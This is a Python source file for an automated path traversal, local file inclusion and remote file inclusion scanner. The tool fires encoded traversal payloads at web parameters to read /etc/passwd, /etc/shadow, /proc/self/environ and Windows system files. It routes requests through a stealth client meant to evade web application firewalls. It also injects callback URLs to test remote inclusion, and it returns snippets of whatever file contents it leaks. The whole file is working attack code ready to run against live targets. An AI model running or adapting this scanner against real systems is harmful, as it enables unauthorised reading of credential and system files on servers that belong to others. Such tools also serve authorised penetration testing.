#!/usr/bin/env python3
"""Path Traversal / LFI / RFI Tester

Tests for path traversal and file inclusion vulnerabilities:
- Directory traversal (../, ..\\, encoded variants)
- Local file inclusion (LFI)
- Remote file inclusion (RFI)
- Callback-based validation for blind LFI

Uses stealth HTTP client for WAF evasion on live targets.
"""

import os
import time
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, quote, unquote

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    # Fallback functions
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)


def test_path_traversal(
    target_url: str,
    param: str = "file",
    file_paths: Optional[List[str]] = None,
    use_callback: bool = False,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for path traversal and file inclusion vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        file_paths: List of file paths to test (if None, uses defaults)
        use_callback: Whether to use callback for blind detection
        callback_url: Optional callback URL for blind LFI
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "path_traversal",
        "test": "path_traversal",
        "vulnerable": False,
        "url": target_url,  # Include URL for detection matching
        "param": param,  # Include parameter name
        "inclusion_type": None,
        "files_read": [],
        "evidence": None
    }
    
    # Default file paths to test
    if not file_paths:
        file_paths = [
            "/etc/passwd",
            "/etc/hosts",
            "/proc/version",
            "/proc/self/environ",
            "/etc/shadow",
            "/windows/win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
    
    # Path traversal payloads
    traversal_payloads = [
        "../",
        "..\\",
        "....//",
        "....\\\\",
        "%2e%2e%2f",
        "%2e%2e%5c",
        "..%2f",
        "..%5c",
        "%252e%252e%252f",
        "..%c0%af",
        "..%c1%9c",
    ]
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    # Check for file content indicators
    indicators = {
        "/etc/passwd": ["root:", "bin/bash", "daemon:", "nobody:"],
        "/etc/hosts": ["localhost", "127.0.0.1", "::1"],
        "/proc/version": ["linux version", "gcc version", "ubuntu"],
        "/proc/self/environ": ["path=", "home=", "user="],
        "/windows/win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
        "hosts": ["localhost", "127.0.0.1"],
    }
    
    def check_response_for_indicators(resp, file_path):
        """Check if response contains file content indicators."""
        content = resp.text.lower()
        
        # Check for file-specific indicators
        file_indicators = []
        for key, inds in indicators.items():
            if key in file_path.lower():
                file_indicators = inds
                break
        
        # Generic file content indicators
        generic_indicators = ["root:", "localhost", "127.0.0.1", "bin/bash", "[fonts]"]
        
        # Check if any indicators are present
        found_indicators = []
        for ind in file_indicators + generic_indicators:
            if ind in content:
                found_indicators.append(ind)
        
        return found_indicators
    
    # Test each file path with different payloads and methods
    for file_path in file_paths:
        # Build payloads: direct path first, then traversal variants
        payloads = [file_path]  # Try direct path first (some apps accept this)
        for traversal in traversal_payloads:
            payloads.append(traversal * 5 + file_path)  # Multiple traversals
        
        for payload in payloads:
            for method in ["GET", "POST"]:
                try:
                    if method == "GET":
                        resp = safe_get(
                            base_url,
                            params={param: payload},
                            timeout=10
                        )
                    else:
                        # Try both form data and JSON for POST
                        resp = safe_post(
                            base_url,
                            data={param: payload},
                            timeout=10
                        )
                    
                    found_indicators = check_response_for_indicators(resp, file_path)
                    
                    if found_indicators:
                        result["vulnerable"] = True
                        result["inclusion_type"] = "lfi"  # Local File Inclusion
                        if file_path not in result["files_read"]:
                            result["files_read"].append(file_path)
                        result["evidence"] = {
                            "payload": payload,
                            "file_path": file_path,
                            "method": method,
                            "indicators_found": found_indicators,
                            "response_snippet": resp.text[:500],
                            "status_code": resp.status_code,
                            "note": f"File content detected in {method} response"
                        }
                        return result  # Found vulnerability, return immediately
                        
                except Exception:
                    continue
        
        if result["vulnerable"]:
            break
    
    # Test remote file inclusion (RFI) if callback URL provided
    if callback_url and not result["vulnerable"]:
        rfi_payloads = [
            callback_url,
            f"http://{callback_url}",
            f"//{callback_url}",
        ]
        
        for rfi_payload in rfi_payloads:
            try:
                resp = safe_get(
                    base_url,
                    params={param: rfi_payload},
                    timeout=10
                )
                
                # Check if callback URL appears in response
                if callback_url in resp.text or "evil.com" in resp.text.lower():
                    result["vulnerable"] = True
                    result["inclusion_type"] = "rfi"  # Remote File Inclusion
                    result["evidence"] = {
                        "payload": rfi_payload,
                        "response_snippet": resp.text[:500],
                        "status_code": resp.status_code,
                        "note": "Remote file inclusion detected"
                    }
                    break
            except Exception:
                continue
    
    return result


def test_path_traversal_params(
    target_url: str,
    params: Optional[List[str]] = None,
    use_callback: bool = False,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test multiple parameters for path traversal
    
    Args:
        target_url: Target URL
        params: List of parameters to test (if None, will discover)
        use_callback: Whether to use callback for blind detection
        callback_url: Optional callback URL for blind LFI
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "path_traversal_multi_param",
        "vulnerable": False,
        "findings": []
    }
    
    # Discover parameters if not provided
    if not params:
        from tools.rest_api_fuzzer import discover_parameters
        discovered_params = discover_parameters(target_url)
        # Always include common path traversal parameter names
        file_params = ["file", "path", "page", "include", "template", "view", "read", "doc", "document"]
        params = list(set(discovered_params + file_params))
    
    # Test each parameter
    for param in params:
        test_result = test_path_traversal(
            target_url,
            param=param,
            use_callback=use_callback,
            callback_url=callback_url
        )
        if test_result["vulnerable"]:
            result["vulnerable"] = True
            result["findings"].append(test_result)
    
    return result


def validate_path_traversal(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for path traversal
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL for OOB detection
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Extract target from discovery data
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Initialize callback correlator if callback server is configured
    correlator = None
    job_id = None
    callback_url = None
    
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"path_traversal_{int(time.time())}"
            token = correlator.register_job(job_id, "path_traversal", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
            print(f"[PATH-TRAVERSAL] Callback enabled: {callback_url}")
        except Exception as e:
            print(f"[PATH-TRAVERSAL] Callback setup failed: {e}, continuing without callbacks")
            callback_server_url = None
    
    # Test path traversal
    test_result = test_path_traversal_params(
        target,
        use_callback=bool(callback_url),
        callback_url=callback_url
    )
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(test_result.get("findings", []))
    
    # Poll for callback hits if callback enabled
    if callback_server_url and correlator:
        print(f"[PATH-TRAVERSAL] Polling for callback hits (job_id: {job_id})...")
        time.sleep(5)  # Wait for potential callback
        hits = correlator.poll_hits(job_id, timeout=60, interval=2)
        if hits:
            print(f"[PATH-TRAVERSAL] Received {len(hits)} callback hit(s)")
            for hit in hits:
                results["findings"].append({
                    "type": "path_traversal_callback_confirmed",
                    "test": "path_traversal_oob",
                    "vulnerable": True,
                    "confidence": "high",
                    "callback_evidence": {
                        "remote_addr": hit.get("remote_addr"),
                        "user_agent": hit.get("user_agent"),
                        "method": hit.get("method"),
                        "path": hit.get("path"),
                        "query_params": hit.get("query_params"),
                        "timestamp": hit.get("timestamp"),
                    },
                    "note": "Path traversal confirmed via out-of-band callback"
                })
                results["vulnerable"] = True
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="Path Traversal Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", help="Parameter to test")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    callback_url = None
    if args.callback_server_url:
        from tools.callback_correlator import CallbackCorrelator
        correlator = CallbackCorrelator(args.callback_server_url)
        job_id = f"path_traversal_{int(time.time())}"
        token = correlator.register_job(job_id, "path_traversal", args.target, timeout=300)
        callback_url = correlator.get_callback_url(token)
    
    if args.param:
        result = test_path_traversal(args.target, param=args.param, callback_url=callback_url)
    else:
        discovery_data = {"target": args.target}
        result = validate_path_traversal(discovery_data, args.callback_server_url)
    
    import json
    print(json.dumps(result, indent=2))

